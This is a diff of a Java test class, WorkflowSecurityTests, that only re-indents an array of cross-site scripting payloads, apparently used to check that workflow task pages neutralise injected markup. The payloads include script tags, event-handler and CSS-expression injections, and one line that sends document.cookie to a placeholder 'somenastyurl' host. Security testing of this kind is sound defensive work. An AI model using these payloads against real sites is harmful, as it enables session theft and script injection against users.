@@ -35,16 +35,16 @@ public class WorkflowSecurityTests extends ContextAwareWebTest
     private final Date timeDate = new Date();
     private final String taskMessage = "PRR Task";
     private final String[] xssStrings = new String[] {
-            "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">",
-            "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">",
-            "<DIV STYLE=\"width: expression(alert('XSS'));\">",
-            "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
-            "<img><scrip<script>t>alert('XSS');<</script>/script>",
-            "<input onfocus=write(1) autofocus>",
-            "<input onblur=write(1) autofocus><input autofocus>",
-            "<body oninput=alert(1)><input autofocus>",
-            "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
-            "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X"
+        "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">",
+        "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">",
+        "<DIV STYLE=\"width: expression(alert('XSS'));\">",
+        "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
+        "<img><scrip<script>t>alert('XSS');<</script>/script>",
+        "<input onfocus=write(1) autofocus>",
+        "<input onblur=write(1) autofocus><input autofocus>",
+        "<body oninput=alert(1)><input autofocus>",
+        "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
+        "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X"
     };
     @Autowired
     UserDashboardPage userDashboardPage;
